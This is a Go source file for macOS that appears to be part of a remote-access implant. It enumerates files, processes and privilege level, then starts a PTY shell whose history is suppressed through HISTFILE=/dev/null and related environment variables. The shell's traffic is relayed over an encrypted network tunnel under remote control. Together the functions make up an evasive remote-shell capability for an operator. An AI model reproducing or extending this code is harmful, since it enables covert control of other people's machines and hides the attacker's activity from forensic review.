//go:build darwin
// +build darwin

package functions

import (
	"bytes"
	"context"
	"fmt"
	"github.com/creack/pty"
	"github.com/shirou/gopsutil/v4/process"
	"github.com/vmihailenco/msgpack/v5"
	"gopher/utils"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"syscall"

	"howett.net/plist"
)

func GetCP() (uint32, uint32) {
	return 0, 0
}

func IsElevated() bool {
	return os.Geteuid() == 0
}

func GetOsVersion() (string, error) {
	f, err := os.Open("/System/Library/CoreServices/SystemVersion.plist")
	if err != nil {
		return "MacOS", nil
	}
	defer f.Close()

	var data map[string]interface{}
	decoder := plist.NewDecoder(f)
	err = decoder.Decode(&data)
	if err != nil {
		return "MacOS", nil
	}

	version, ok := data["ProductVersion"].(string)
	if !ok {
		return "MacOS", nil
	}

	return fmt.Sprintf("MacOS %s", version), nil
}

func NormalizePath(relPath string) (string, error) {
	if strings.HasPrefix(relPath, "~") {
		usr, err := user.Current()
		if err != nil {
			return "", err
		}
		relPath = filepath.Join(usr.HomeDir, relPath[1:])
	}
	path, err := filepath.Abs(relPath)
	if err != nil {
		return "", err
	}
	path = filepath.Clean(path)
	return path, nil
}

func GetListing(path string) ([]utils.FileInfo, error) {
	var Files []utils.FileInfo

	entries, err := os.ReadDir(path)
	if err != nil {
		return Files, err
	}

	for _, entry := range entries {
		fullPath := filepath.Join(path, entry.Name())
		info, err := os.Lstat(fullPath)
		if err != nil {
			return Files, err
		}

		mode := info.Mode()
		isLink := mode&os.ModeSymlink != 0

		isDir := info.IsDir()

		if isLink {
			if targetInfo, err := os.Stat(fullPath); err == nil {
				isDir = targetInfo.IsDir()
			}
		}

		stat, ok := info.Sys().(*syscall.Stat_t)
		var nlink uint64 = 1
		var uid, gid int
		if ok {
			nlink = uint64(stat.Nlink)
			uid = int(stat.Uid)
			gid = int(stat.Gid)
		}

		username := fmt.Sprintf("%d", uid)
		if u, err := user.LookupId(username); err == nil {
			username = u.Username
		}
		group := fmt.Sprintf("%d", gid)
		if g, err := user.LookupGroupId(group); err == nil {
			group = g.Name
		}

		fileInfo := utils.FileInfo{
			Mode:     mode.String(),
			Nlink:    int(nlink),
			User:     username,
			Group:    group,
			Size:     info.Size(),
			Date:     info.ModTime().Format("Jan _2 15:04"),
			Filename: entry.Name(),
			IsDir:    isDir,
		}
		Files = append(Files, fileInfo)
	}
	return Files, nil
}

func GetProcesses() ([]utils.PsInfo, error) {
	var Processes []utils.PsInfo

	procs, err := process.Processes()
	if err != nil {
		return nil, err
	}

	for _, p := range procs {
		ppid, err := p.Ppid()
		if err != nil {
			ppid = 0
		}

		username, err := p.Username()
		if err != nil {
			username = ""
		}

		tty, err := p.Terminal()

		cmdline, err := p.Cmdline()
		if err != nil || cmdline == "" {
			cmdline, _ = p.Name()
		}

		psInfo := utils.PsInfo{
			Pid:     int(p.Pid),
			Ppid:    int(ppid),
			Context: username,
			Tty:     tty,
			Process: cmdline,
		}
		Processes = append(Processes, psInfo)
	}

	return Processes, nil
}

func IsProcessRunning(cmd *exec.Cmd) bool {
	if cmd.Process == nil {
		return false
	}
	err := cmd.Process.Signal(syscall.Signal(0))
	if err != nil {
		return false
	}
	return true
}

func StartPtyCommand(process *exec.Cmd, columns uint16, rows uint16) (any, error) {
	process.Env = append(os.Environ(),
		"HISTORY=", "HISTSIZE=0", "HISTSAVE=",
		"HISTZONE=", "HISTLOG=", "HISTFILE=",
		"HISTFILE=/dev/null", "HISTFILESIZE=0",
	)
	windowSize := pty.Winsize{Rows: rows, Cols: columns}

	return pty.StartWithSize(process, &windowSize)
}

func StopPty(Pipe any) error {
	src := Pipe.(*os.File)
	return src.Close()
}

func RelayMsgToFile(ctx context.Context, cancel context.CancelFunc, src net.Conn, dstPipe any, tunKey []byte) {

	dst := dstPipe.(*os.File)
	procSrvRead := func(data []byte) []byte {
		var inMessage utils.Message
		recvData, err := utils.DecryptData(data, tunKey)
		if err != nil {
			return nil
		}

		err = msgpack.Unmarshal(recvData, &inMessage)
		if err != nil {
			return nil
		}

		var buffer bytes.Buffer
		for _, obj := range inMessage.Object {
			var command utils.Command
			err = msgpack.Unmarshal(obj, &command)
			if err != nil {
				return nil
			}

			if command.Code == 1 {
				cancel()
				return nil
			}

			buffer.Write(command.Data)
		}

		return buffer.Bytes()
	}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			data, err := RecvMsg(src)
			if err != nil {
				cancel()
				continue
			}
			processed := procSrvRead(data)
			if processed != nil {
				written := 0
				for written < len(processed) {
					w, err := dst.Write(processed[written:])
					if err != nil {
						cancel()
						continue
					}
					written += w
				}
			}
		}
	}
}

func RelayFileToMsg(ctx context.Context, cancel context.CancelFunc, srcPipe any, dst net.Conn, tunKey []byte) {
	src := srcPipe.(*os.File)

	procSrvWrite := func(data []byte) []byte {
		buf, err := utils.EncryptData(data, tunKey)
		if err != nil {
			return nil
		}
		return buf
	}

	buf := make([]byte, 10000)
	for {
		select {
		case <-ctx.Done():
			return
		default:
			n, err := src.Read(buf)
			if err != nil {
				cancel()
				continue
			}
			processed := procSrvWrite(buf[:n])
			if processed == nil {
				continue
			}
			err = SendMsg(dst, processed)
			if err != nil {
				cancel()
				continue
			}
		}
	}
}
